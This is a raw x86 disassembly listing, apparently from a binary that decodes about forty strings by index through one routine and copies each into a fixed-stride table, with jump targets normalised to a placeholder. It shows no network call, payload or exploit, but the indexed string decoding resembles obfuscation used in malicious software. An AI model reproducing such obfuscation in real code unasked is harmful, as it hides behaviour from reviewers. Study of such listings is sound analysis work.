lea edi [ ebp - 0x5d8 ]
mov eax 0x5d
call sub_1000ce20
lea edi [ ebp - 0x5f8 ]
mov eax 0x118
call sub_1000ce20
lea edi [ ebp - 0x72c ]
mov eax 0x67
call sub_1000ce20
lea edi [ ebp - 0x578 ]
mov eax 0x112
call sub_1000ce20
lea edi [ ebp - 0x288 ]
mov eax 0x69
call sub_1000ce20
lea edi [ ebp - 0x844 ]
mov eax 0x131
call sub_1000ce20
lea edi [ ebp - 0x708 ]
mov eax 0xf4
call sub_1000ce20
lea edi [ ebp - 0x234 ]
mov eax 0x103
call sub_1000ce20
lea edi [ ebp - 0x9ac ]
mov eax 0x10c
call sub_1000ce20
lea edi [ ebp - 0x9fc ]
mov eax 0x63
call sub_1000ce20
lea edi [ ebp - 0x218 ]
mov eax 0x9f
call sub_1000ce20
lea edi [ ebp - 0xac ]
mov eax 0xff
call sub_1000ce20
lea edi [ ebp - 0x538 ]
mov eax 0xa4
call sub_1000ce20
lea edi [ ebp - 0x2a4 ]
mov eax 0x71
call sub_1000ce20
lea edi [ ebp - 0x1fc ]
mov eax 0x28
call sub_1000ce20
lea edi [ ebp - 0x3a0 ]
mov eax 0xd9
call sub_1000ce20
lea edi [ ebp - 0x988 ]
mov eax 0x143
call sub_1000ce20
lea edi [ ebp - 0xb64 ]
mov eax 0xe1
call sub_1000ce20
lea edi [ ebp - 0xa9c ]
mov eax 0xa5
call sub_1000ce20
lea edi [ ebp - 0x638 ]
mov eax 0x3f
call sub_1000ce20
lea edi [ ebp - 0x20 ]
mov eax 0x158
call sub_1000ce20
lea edi [ ebp - 0x3d8 ]
mov eax 0xcc
call sub_1000ce20
lea edi [ ebp - 0x8d4 ]
mov eax 0xdb
call sub_1000ce20
lea edi [ ebp - 0x558 ]
mov eax 0x7e
call sub_1000ce20
lea edi [ ebp - 0xf4 ]
mov eax 0x122
call sub_1000ce20
lea edi [ ebp - 0x774 ]
mov eax 0x42
call sub_1000ce20
lea edi [ ebp - 0xa4c ]
xor eax eax
call sub_1000ce20
lea edi [ ebp - 0x64 ]
mov eax 0xe9
call sub_1000ce20
lea edi [ ebp - 0x88c ]
mov eax 0xb8
call sub_1000ce20
lea edi [ ebp - 0xc94 ]
mov eax 0x51
call sub_1000ce20
lea edi [ ebp - 0x7c ]
mov eax 0x126
call sub_1000ce20
lea edi [ ebp - 0x678 ]
mov eax 0x2f
call sub_1000ce20
lea edi [ ebp - 0xcd0 ]
mov eax 0xd3
call sub_1000ce20
lea edi [ ebp - 0x124 ]
mov eax 0xb9
call sub_1000ce20
lea edi [ ebp - 0xc64 ]
mov eax 0x151
call sub_1000ce20
lea edi [ ebp - 0x4d8 ]
mov eax 0x110
call sub_1000ce20
lea edi [ ebp - 0x2dc ]
mov eax 0x7a
call sub_1000ce20
lea edi [ ebp - 0x314 ]
mov eax 0x55
call sub_1000ce20
lea edi [ ebp - 0x154 ]
mov eax 0xd1
call sub_1000ce20
lea edi [ ebp - 0x91c ]
mov eax 0xce
call sub_1000ce20
lea edi [ ebp - 0x1e0 ]
mov eax 0x60
call sub_1000ce20
lea edi [ ebp - 0x518 ]
mov eax 0x3a
call sub_1000ce20
lea eax [ ebp - 0x2f8 ]
lea edx [ eax + 0x1 ]
pop edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x2f8 ]
push edx
push esi
call sub_1007f580
lea eax [ ebp - 0x9d4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x9d4 ]
push eax
lea ecx [ esi + 0x108 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x10c ]
add esp 0xc
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x10c ]
push edx
lea eax [ esi + 0x210 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x170 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x170 ]
push ecx
lea edx [ esi + 0x318 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x658 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x658 ]
push eax
lea ecx [ esi + 0x420 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x13c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x13c ]
push edx
lea eax [ esi + 0x528 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x7d8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x7d8 ]
push ecx
lea edx [ esi + 0x630 ]
push edx
call sub_1007f580
lea eax [ ebp - 0xaec ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xaec ]
push eax
lea ecx [ esi + 0x738 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x34c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x34c ]
push edx
lea eax [ esi + 0x840 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x26c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x26c ]
push ecx
lea edx [ esi + 0x948 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x3bc ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x3bc ]
push eax
lea ecx [ esi + 0xa50 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x8f8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x8f8 ]
push edx
lea eax [ esi + 0xb58 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x820 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x820 ]
push ecx
lea edx [ esi + 0xc60 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x8b0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x8b0 ]
push eax
lea ecx [ esi + 0xd68 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x598 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x598 ]
push edx
lea eax [ esi + 0xe70 ]
push eax
call sub_1007f580
lea eax [ ebp - 0xc ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xc ]
push ecx
lea edx [ esi + 0xf78 ]
push edx
call sub_1007f580
lea eax [ ebp - 0xdc ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xdc ]
push eax
lea ecx [ esi + 0x1080 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x1c4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x1c4 ]
push edx
lea eax [ esi + 0x1188 ]
push eax
call sub_1007f580
lea eax [ ebp - 0xc38 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xc38 ]
push ecx
lea edx [ esi + 0x1290 ]
push edx
call sub_1007f580
lea eax [ ebp - 0xc0c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xc0c ]
push eax
lea ecx [ esi + 0x1398 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x384 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x384 ]
push edx
lea eax [ esi + 0x14a0 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x2c0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x2c0 ]
push ecx
lea edx [ esi + 0x15a8 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x6e4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x6e4 ]
push eax
lea ecx [ esi + 0x16b0 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x330 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x330 ]
push edx
lea eax [ esi + 0x17b8 ]
push eax
call sub_1007f580
lea eax [ ebp - 0xb8c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xb8c ]
push ecx
lea edx [ esi + 0x18c0 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x438 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x438 ]
push eax
lea ecx [ esi + 0x19c8 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x368 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x368 ]
push edx
lea eax [ esi + 0x1ad0 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x18c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x18c ]
push ecx
lea edx [ esi + 0x1bd8 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x964 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x964 ]
push eax
lea ecx [ esi + 0x1ce0 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x3f8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x3f8 ]
push edx
lea eax [ esi + 0x1de8 ]
push eax
call sub_1007f580
lea eax [ ebp - 0xac4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xac4 ]
push ecx
lea edx [ esi + 0x1ef0 ]
push edx
call sub_1007f580
lea eax [ ebp - 0xa74 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xa74 ]
push eax
lea ecx [ esi + 0x1ff8 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x4b8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x4b8 ]
push edx
lea eax [ esi + 0x2100 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x5b8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x5b8 ]
push ecx
lea edx [ esi + 0x2208 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x478 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x478 ]
push eax
lea ecx [ esi + 0x2310 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x4f8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x4f8 ]
push edx
lea eax [ esi + 0x2418 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x1a8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x1a8 ]
push ecx
lea edx [ esi + 0x2520 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x69c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x69c ]
push eax
lea ecx [ esi + 0x2628 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0xc4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0xc4 ]
push edx
lea eax [ esi + 0x2730 ]
push eax
call sub_1007f580
lea eax [ ebp - 0xbb4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xbb4 ]
push ecx
lea edx [ esi + 0x2838 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x868 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x868 ]
push eax
lea ecx [ esi + 0x2940 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x4c ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x4c ]
push edx
lea eax [ esi + 0x2a48 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x418 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x418 ]
push ecx
lea edx [ esi + 0x2b50 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x618 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x618 ]
push eax
lea ecx [ esi + 0x2c58 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x7fc ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x7fc ]
push edx
lea eax [ esi + 0x2d60 ]
push eax
call sub_1007f580
lea eax [ ebp - 0xbe0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xbe0 ]
push ecx
lea edx [ esi + 0x2e68 ]
push edx
call sub_1007f580
lea eax [ ebp - 0xb14 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xb14 ]
push eax
lea ecx [ esi + 0x2f70 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x940 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x940 ]
push edx
lea eax [ esi + 0x3078 ]
push eax
call sub_1007f580
lea eax [ ebp - 0xb3c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xb3c ]
push ecx
lea edx [ esi + 0x3180 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x458 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x458 ]
push eax
lea ecx [ esi + 0x3288 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x798 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x798 ]
push edx
lea eax [ esi + 0x3390 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x94 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x94 ]
push ecx
lea edx [ esi + 0x3498 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x498 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x498 ]
push eax
lea ecx [ esi + 0x35a0 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x34 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x34 ]
push edx
lea eax [ esi + 0x36a8 ]
push eax
call sub_1007f580
lea eax [ ebp - 0xa24 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xa24 ]
push ecx
lea edx [ esi + 0x37b0 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x250 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x250 ]
push eax
lea ecx [ esi + 0x38b8 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x6c0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x6c0 ]
push edx
lea eax [ esi + 0x39c0 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x750 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x750 ]
push ecx
lea edx [ esi + 0x3ac8 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x5d8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x5d8 ]
push eax
lea ecx [ esi + 0x3bd0 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x5f8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x5f8 ]
push edx
lea eax [ esi + 0x3cd8 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x72c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x72c ]
push ecx
lea edx [ esi + 0x3de0 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x578 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x578 ]
push eax
lea ecx [ esi + 0x3ee8 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x288 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x288 ]
push edx
lea eax [ esi + 0x3ff0 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x844 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x844 ]
push ecx
lea edx [ esi + 0x40f8 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x708 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x708 ]
push eax
lea ecx [ esi + 0x4200 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x234 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x234 ]
push edx
lea eax [ esi + 0x4308 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x9ac ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x9ac ]
push ecx
lea edx [ esi + 0x4410 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x9fc ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x9fc ]
push eax
lea ecx [ esi + 0x4518 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x218 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x218 ]
push edx
lea eax [ esi + 0x4620 ]
push eax
call sub_1007f580
lea eax [ ebp - 0xac ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xac ]
push ecx
lea edx [ esi + 0x4728 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x538 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x538 ]
push eax
lea ecx [ esi + 0x4830 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x2a4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x2a4 ]
push edx
lea eax [ esi + 0x4938 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x1fc ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x1fc ]
push ecx
lea edx [ esi + 0x4a40 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x3a0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x3a0 ]
push eax
lea ecx [ esi + 0x4b48 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x988 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x988 ]
push edx
lea eax [ esi + 0x4c50 ]
push eax
call sub_1007f580
lea eax [ ebp - 0xb64 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xb64 ]
push ecx
lea edx [ esi + 0x4d58 ]
push edx
call sub_1007f580
lea eax [ ebp - 0xa9c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xa9c ]
push eax
lea ecx [ esi + 0x4e60 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x638 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x638 ]
push edx
lea eax [ esi + 0x4f68 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x20 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x20 ]
push ecx
lea edx [ esi + 0x5070 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x3d8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x3d8 ]
push eax
lea ecx [ esi + 0x5178 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x8d4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x8d4 ]
push edx
lea eax [ esi + 0x5280 ]
push eax
call sub_1007f580
lea eax [ ebp - 0x558 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x558 ]
push ecx
lea edx [ esi + 0x5388 ]
push edx
call sub_1007f580
lea eax [ ebp - 0xf4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0xf4 ]
push eax
lea ecx [ esi + 0x5490 ]
push ecx
call sub_1007f580
lea eax [ ebp - 0x774 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x774 ]
push edx
lea eax [ esi + 0x5598 ]
push eax
call sub_1007f580
lea eax [ ebp - 0xa4c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xa4c ]
push ecx
lea edx [ esi + 0x56a0 ]
push edx
call sub_1007f580
lea eax [ ebp - 0x64 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
